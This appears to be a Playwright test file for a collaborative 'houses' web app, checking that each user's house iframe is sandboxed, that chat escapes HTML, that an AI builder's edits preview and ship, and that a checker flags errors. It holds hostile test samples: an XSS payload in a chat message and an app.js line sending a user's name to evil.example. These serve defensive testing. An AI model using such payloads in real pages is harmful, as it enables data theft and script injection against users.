import assert from "node:assert/strict";
import { createRequire } from "node:module";
import { after, before, describe, test } from "node:test";
import { BrowserChecker } from "../src/server/agent/check.ts";
import { Client, FakeChecker, ScriptedModel, assistant, startApp, text, toolUse, waitUntil, type TestApp } from "./helpers.ts";

let playwright: any;
try {
  playwright = createRequire(import.meta.url)("playwright");
} catch {
  playwright = null;
}

const skip = playwright ? false : "playwright is not installed";

async function signupInBrowser(page: any, base: string, username: string, name: string): Promise<void> {
  await page.goto(base);
  await page.click("button:text-is('Sign up')");
  await page.fill("input[name=username]", username);
  await page.fill("input[name=displayName]", name);
  await page.fill("input[name=password]", "a long enough password");
  await page.click("button[type=submit]");
  await page.waitForSelector("text=Your houses");
}

function houseFrame(page: any): any {
  return page.frames().find((f: any) => f.url().includes(".houses.localhost"));
}

describe("in a real browser", { skip }, () => {
  let t: TestApp;
  let browser: any;
  let model: ScriptedModel;

  before(async () => {
    model = new ScriptedModel([]);
    t = await startApp({ model, checker: new FakeChecker() });
    browser = await playwright.chromium.launch();
  });
  after(async () => {
    await browser?.close();
    await t?.close();
  });

  test("the house frame is sandboxed: opaque origin, no storage, no parent access, no network", async () => {
    const page = await (await browser.newContext()).newPage();
    await signupInBrowser(page, t.base, "sandbox_sue", "Sue");
    await page.fill("input[placeholder^='Name your house']", "Sandbox");
    await page.click("button:text-is('Create house')");
    await page.frameLocator("iframe.house-frame").locator("#house-name").waitFor();
    const attrs = await page.locator("iframe.house-frame").evaluate((el: HTMLIFrameElement) => ({
      sandbox: el.getAttribute("sandbox"),
      allow: el.getAttribute("allow"),
    }));
    assert.equal(attrs.sandbox, "allow-scripts allow-forms allow-pointer-lock");
    assert.equal(attrs.allow, "autoplay; gamepad");

    // Passed as a string: tsx would otherwise inject helpers that don't exist in the page.
    const probes = await houseFrame(page).evaluate(`(async (apiBase) => {
      const out = {};
      const attempt = async (name, fn) => {
        try {
          out[name] = "allowed:" + String(await fn());
        } catch (e) {
          out[name] = "blocked";
        }
      };
      out.origin = self.origin;
      await attempt("localStorage", () => localStorage.setItem("k", "v"));
      await attempt("cookie", () => document.cookie);
      await attempt("parentDom", () => window.parent.document.title);
      await attempt("topLocation", () => window.top.location.href);
      await attempt("fetchApi", () => fetch(apiBase + "/api/me").then((r) => r.status));
      await attempt("fetchExternal", () => fetch("https://example.com/").then((r) => r.status));
      await attempt("websocket", () => new Promise((res, rej) => {
        const ws = new WebSocket(apiBase.replace("http", "ws") + "/ws");
        ws.onopen = () => res("open");
        ws.onerror = () => rej(new Error("x"));
      }));
      await attempt("ownFile", () => fetch("style.css").then((r) => r.status));
      return out;
    })(${JSON.stringify(t.base)})`);
    assert.equal(probes.origin, "null");
    assert.equal(probes.localStorage, "blocked");
    assert.equal(probes.cookie, "blocked");
    assert.equal(probes.parentDom, "blocked");
    assert.equal(probes.topLocation, "blocked");
    assert.equal(probes.fetchApi, "blocked");
    assert.equal(probes.fetchExternal, "blocked");
    assert.equal(probes.websocket, "blocked");
    assert.equal(probes.ownFile, "allowed:200");
    await page.context().close();
  });

  test("a house that navigates away is cut off and reloaded", async () => {
    const page = await (await browser.newContext()).newPage();
    await signupInBrowser(page, t.base, "nav_nora", "Nora");
    await page.fill("input[placeholder^='Name your house']", "Navigator");
    await page.click("button:text-is('Create house')");
    await page.frameLocator("iframe.house-frame").locator("#house-name").waitFor();
    const first = await page.locator("iframe.house-frame").elementHandle();
    await houseFrame(page).evaluate(() => {
      location.href = "about:blank#exfil=secret";
    });
    await page.waitForSelector("text=tried to navigate away");
    await waitUntil(async () => (await page.locator("iframe.house-frame").elementHandle()) !== first);
    await page.frameLocator("iframe.house-frame").locator("#house-name").waitFor();
    await page.context().close();
  });

  test("two people chat in realtime, then one builds, previews and ships a change the other sees live", async () => {
    const pa = await (await browser.newContext({ viewport: { width: 1200, height: 800 } })).newPage();
    const pb = await (await browser.newContext({ viewport: { width: 390, height: 800 } })).newPage();
    await signupInBrowser(pa, t.base, "ui_alice", "Alice");
    await signupInBrowser(pb, t.base, "ui_bob", "Bob");
    await pa.fill("input[placeholder^='Name your house']", "The Clubhouse");
    await pa.click("button:text-is('Create house')");
    await pa.waitForURL(/\/house\//);
    const houseId = pa.url().split("/").pop();

    await pa.click("button:text-is('Invite')");
    await pa.click("button:text-is('New invite link')");
    await pa.waitForFunction(() => (document.querySelector(".drawer input[readonly]") as HTMLInputElement)?.value);
    const invite = await pa.locator(".drawer input[readonly]").inputValue();
    await pb.goto(invite);
    await pb.click("button:text-is('Move in')");
    await pb.waitForURL(/\/house\//);

    const fa = pa.frameLocator("iframe.house-frame");
    const fb = pb.frameLocator("iframe.house-frame");
    await fb.locator("#input").fill("hi alice <img src=x onerror=alert(1)>");
    await fb.locator("#input").press("Enter");
    const bubble = fa.locator(".msg .body", { hasText: "hi alice" });
    await bubble.waitFor();
    assert.equal(await bubble.textContent(), "hi alice <img src=x onerror=alert(1)>");
    assert.equal(await fa.locator(".msg .body img").count(), 0);

    model.setScript([
      assistant([toolUse("edit_file", { path: "index.html", old_text: "Ask the builder to turn this room into anything.", new_text: "Now with a jukebox." })]),
      assistant([text("Added a jukebox sign to the living room.")], "end_turn"),
    ]);
    await pa.click("button:text-is('✦ Build')");
    await pa.fill(".drawer textarea", "add a jukebox");
    await pa.click("button:text-is('Build it')");
    await pa.waitForSelector(".pill.ready", { timeout: 10_000 });
    await pa.click(".run button:text-is('Preview')");
    await fa.locator("text=Now with a jukebox.").waitFor();
    assert.equal(await fb.locator("text=Now with a jukebox.").count(), 0, "preview is private");
    await pa.click(".banner button:text-is('Ship it')");
    await fb.locator("text=Now with a jukebox.").waitFor({ timeout: 10_000 });
    await pb.waitForSelector("text=Alice changed the house");

    // Chat history survived the code change.
    await fb.locator(".msg .body", { hasText: "hi alice" }).waitFor();
    assert.ok(houseId);
    await pa.context().close();
    await pb.context().close();
  });
});

describe("check tool in a real browser", { skip }, () => {
  let t: TestApp;
  let checker: BrowserChecker;
  let owner: Client;
  let houseId: string;

  before(async () => {
    t = await startApp();
    checker = new BrowserChecker(t.cfg.platformOrigin);
    owner = new Client(t);
    await owner.signup("checker_cat");
    houseId = await owner.createHouse("Check Me");
  });
  after(async () => {
    await checker.close();
    await t.close();
  });

  test("the default house renders cleanly at both sizes", async () => {
    const { url } = (await owner.req("GET", `/api/houses/${houseId}/frame`)).json;
    const r = await checker.check(url, "Check Me");
    assert.equal(r.available, true);
    assert.equal(r.connected, true);
    assert.deepEqual(r.errors, []);
    assert.deepEqual(r.blocked, []);
    assert.equal(r.screenshots.length, 2);
    for (const s of r.screenshots) assert.ok(s.png.length > 1000);
  });

  test("errors and blocked requests in a broken house are reported", async () => {
    const svc = t.app.svc;
    const runId = "00000000000000aa";
    const live = (await owner.req("GET", `/api/houses/${houseId}`)).json.house.liveSha;
    const dir = await svc.repos.addWorktree(houseId, runId, live);
    const fs = await import("node:fs/promises");
    await fs.writeFile(
      `${dir}/app.js`,
      `const house = await House.ready;\nfetch("https://evil.example/steal?d=" + house.me.name).catch(() => {});\nnull.boom();\n`,
    );
    const sha = await svc.repos.commitWorktree(houseId, runId, "broken", { name: "t", email: "t@t.invalid" });
    const url = await svc.houses.frameUrl(houseId, sha);
    const r = await checker.check(url, "Check Me");
    assert.equal(r.connected, true);
    assert.ok(r.errors.some((e) => /null|boom|Cannot read/.test(e)), JSON.stringify(r.errors));
    assert.ok(r.blocked.some((b) => /evil\.example/.test(b)), JSON.stringify(r.blocked));
    await svc.repos.removeWorktree(houseId, runId);
  });
});
